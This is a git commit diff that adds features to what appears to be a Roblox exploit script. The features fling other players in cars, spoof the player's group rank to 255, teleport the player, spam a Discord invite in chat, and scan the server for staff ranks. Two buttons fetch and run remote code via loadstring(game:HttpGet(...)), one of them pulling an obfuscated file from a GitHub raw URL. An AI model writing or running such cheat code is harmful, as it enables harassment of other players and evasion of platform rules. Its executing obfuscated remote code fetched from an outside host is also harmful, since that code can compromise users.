312b92340acbe9455bffe0a9b1e72d9ee55defb9
npc <102553808+thepro1npc@users.noreply.github.com>
2024-06-25 02:02:31 -0400

    Update z.lua

--- z.lua
+++ z.lua
@@ -83,13 +83,258 @@ sendNotification("NOTIFICATION", "Scanner is WORKING")
 -- Listen for new players joining
 game.Players.PlayerAdded:Connect(checkAndNotifyHR)
 
+local function flingAll()
+    for _, v in pairs(workspace.SpawnedCars:GetChildren()) do
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.PrimaryPart.CFrame
+        task.wait(0.2)
+    end
+end
+
  local Tab = Window:CreateTab("Main Page", 4483362458) -- Title, Image
 
  local Section = Tab:CreateSection("Main Page")
 
  local Button = Tab:CreateButton({
-    Name = "Button Example",
+    Name = "Fling Users in Cars",
     Callback = function()
-    -- The function that takes place when the button is pressed
+        flingAll()
     end,
  })
+
+ local Button = Tab:CreateButton({
+    Name = "Fling GUI",
+    Callback = function ()
+		loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt'), true))()
+    end,
+ })
+
+ local Button = Tab:CreateButton({
+    Name = "Infinite Yield",
+    Callback = function ()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+    end,
+ })
+
+ local Button = Tab:CreateButton({
+    Name = "Open Any Door (client-sided)",
+    Callback = function ()
+		game.Players.LocalPlayer.GroupInfo.Rank.Value = 255
+    end,
+ })
+
+ local Button = Tab:CreateButton({
+	Name = "Scan for HR's!",
+	Callback = function()
+		local hrCount = countPlayersByRank(hrRankNames)
+		local hrUsernames = {}  -- Table to store HR usernames
+		for _, player in ipairs(game.Players:GetPlayers()) do
+			local success, rank = pcall(function()
+				return player:GetRoleInGroup(groupId)
+			end)
+			if success then
+				for _, rankName in ipairs(hrRankNames) do
+					if rankName == rank then
+						table.insert(hrUsernames, player.Name)  -- Add HR username to the table
+						break
+					end
+				end
+			end
+		end
+		local hrUsernamesStr = table.concat(hrUsernames, ", ")  -- Concatenate usernames into a string
+		if hrCount > 3 then
+			sendNotification("HR SCAN", "There are " .. hrCount .. " HR's in-game:\n" .. hrUsernamesStr)
+		else
+			sendNotification("HR SCAN", "There are " .. hrCount .. " HR's in-game:\n" .. hrUsernamesStr)
+		end
+  		print("HR scan completed")
+  	end    
+})
+
+local Button = Tab:CreateButton({
+	Name = "Scan for MR's!",
+	Callback = function()
+		local mrCount = countPlayersByRank(mrRankNames)
+		local mrUsernames = {}  -- Table to store MR usernames
+		for _, player in ipairs(game.Players:GetPlayers()) do
+			local success, rank = pcall(function()
+				return player:GetRoleInGroup(groupId)
+			end)
+			if success then
+				for _, rankName in ipairs(mrRankNames) do
+					if rankName == rank then
+						table.insert(mrUsernames, player.Name)  -- Add MR username to the table
+						break
+					end
+				end
+			end
+		end
+		local mrUsernamesStr = table.concat(mrUsernames, ", ")  -- Concatenate usernames into a string
+		if mrCount > 3 then
+			sendNotification("MR SCAN", "There are " .. mrCount .. " MR's in-game:\n" .. mrUsernamesStr)
+		else
+			sendNotification("MR SCAN", "There are " .. mrCount .. " MR's in-game:\n" .. mrUsernamesStr)
+		end
+  		print("MR scan completed")
+  	end    
+})
+
+local isSpamming = false
+
+local Toggle = Tab:CreateToggle({
+	Name = "Spam Discord Invite",
+	Default = false,
+	Callback = function(Value)
+		isSpamming = Value
+		while isSpamming do
+			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(". g g / washieztroll", "All")
+			wait(1)
+		end
+		print("Spam toggle:", Value)
+	end    
+})
+
+local Tab = Window:CreateTab("Teleporters", 4483362458) -- Title, Image
+
+local Section = Tab:CreateSection("Teleporters")
+
+local Button = Tab:CreateButton({
+    Name = "Spawn",
+    Callback = function()
+		local targetPosition = Vector3.new(-106, 4, 99)
+		game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+    end    
+})
+
+local Button = Tab:CreateButton({
+    Name = "Middle Area",
+    Callback = function()
+		local targetPosition = Vector3.new(351, 4, 100)
+		game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+    end    
+})
+
+local Button = Tab:CreateButton({
+    Name = "Cafe",
+    Callback = function()
+		local targetPosition = Vector3.new(463, 4, 206)
+		game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+    end    
+})
+
+local Button = Tab:CreateButton({
+    Name = "Gas Station",
+    Callback = function()
+		local targetPosition = Vector3.new(494, 3, -181)
+		game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+    end    
+})
+
+local Button = Tab:CreateButton({
+    Name = "Headquarters",
+    Callback = function()
+		local targetPosition = Vector3.new(-46, 4, -201)
+		game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+    end    
+})
+
+local Button = Tab:CreateButton({
+    Name = "Prison Outdoor",
+    Callback = function()
+		local targetPosition = Vector3.new(257, 3, -504)
+		game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+    end    
+})
+
+local Button = Tab:CreateButton({
+    Name = "Prison Indoor",
+    Callback = function()
+		local targetPosition = Vector3.new(267, 4, -570)
+		game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+    end    
+})
+
+local Button = Tab:CreateButton({
+    Name = "Raceway",
+    Callback = function()
+		local targetPosition = Vector3.new(449, 27, 470)
+		game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+    end    
+})
+
+local Button = Tab:CreateButton({
+    Name = "Staff Spawn",
+    Callback = function()
+		local targetPosition = Vector3.new(294, 4, -192)
+		game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+    end    
+})
+
+local Tab = Window:CreateTab("Training Teleporters", 4483362458) -- Title, Image
+
+local Section = Tab:CreateSection("Training Teleporters")
+
+local Button = Tab:CreateButton({
+    Name = "Group A",
+    Callback = function()
+		local targetPosition = Vector3.new(-473, 4, -315)
+		game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+    end    
+})
+
+local Button = Tab:CreateButton({
+    Name = "Group B",
+    Callback = function()
+		local targetPosition = Vector3.new(-565, 4, -313)
+		game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+    end    
+})
+
+local Button = Tab:CreateButton({
+    Name = "Group C",
+    Callback = function()
+		local targetPosition = Vector3.new(-657, 4, -314)
+		game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+    end    
+})
+
+local Button = Tab:CreateButton({
+    Name = "Group D",
+    Callback = function()
+		local targetPosition = Vector3.new(-473, 4, -418)
+		game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+    end    
+})
+
+local Button = Tab:CreateButton({
+    Name = "Group E",
+    Callback = function()
+		local targetPosition = Vector3.new(-564, 4, -420)
+		game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+    end    
+})
+
+local Button = Tab:CreateButton({
+    Name = "Group F",
+    Callback = function()
+		local targetPosition = Vector3.new(-656, 4, -419)
+		game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+    end    
+})
+
+local Tab = Window:CreateTab("Misc", 4483362458) -- Title, Image
+
+local Section = Tab:CreateSection("Misc")
+
+local Paragraph = Tab:CreateParagraph({Title = "VERSION", Content = "Beta 0.1"})
+
+local Paragraph = Tab:CreateParagraph({Title = "DISCORD", Content = "discord.gg/washieztroll"})
+
+local Paragraph = Tab:CreateParagraph({Title = "CREDIT", Content = "Credit to @patriotic_american on Discord!"})
+
+local Button = Tab:CreateButton({
+    Name = "Raid Meetup (if neded)",
+    Callback = function()
+		local targetPosition = Vector3.new(799, 3, -590)
+		game.Players.LocalPlayer.Character:MoveTo(targetPosition)
+    end    
+})
